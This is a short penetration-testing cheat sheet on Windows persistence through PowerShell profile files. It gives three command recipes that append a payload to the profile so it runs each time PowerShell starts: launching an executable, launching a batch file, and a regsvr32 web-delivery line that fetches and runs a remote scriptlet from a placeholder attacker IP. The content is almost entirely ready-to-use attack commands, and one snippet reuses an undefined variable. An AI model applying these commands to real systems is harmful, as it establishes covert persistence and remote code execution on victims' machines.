# Powershell Profile

## 01 - Powershell

### 1.1 - Dropper

```powershell
PS C:\> echo $profile
Test-Path $profile
New-Item -Path $profile -Type File -Force
$string = 'Start-Process "C:\tmp\pentestlab.exe"'
$string | Out-File -FilePath "C:\Users\pentestlab\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```

### 1.2 - Batch Script

```powershell
PS C:\> echo $profile
Test-Path $profile
New-Item -Path $profile -Type File -Force
Add-Content $profile "Invoke-Item C:\tmp\launcher.bat"
$string | Out-File -FilePath "C:\Users\pentestlab\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```

### 1.3 - Web Delivery

```powershell
PS C:\> echo $profile
Test-Path $profile
New-Item -Path $profile -Type File -Force
$string = 'Invoke-Command -ScriptBlock { regsvr32 /s /n /u /i:http://<IP>/shell.sct scrobj.dll }'
$string | Out-File -FilePath "C:\Users\pentestlab\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```

## References

- [PentestLab: Persistence Powershell Profile](https://pentestlab.blog/2019/11/05/persistence-powershell-profile/)

- [Abusing Powershell Profiles](https://enigma0x3.net/2014/06/16/abusing-powershell-profiles/)

- [PowershellProfile Macro](https://github.com/enigma0x3/PowershellProfile/blob/master/Macro)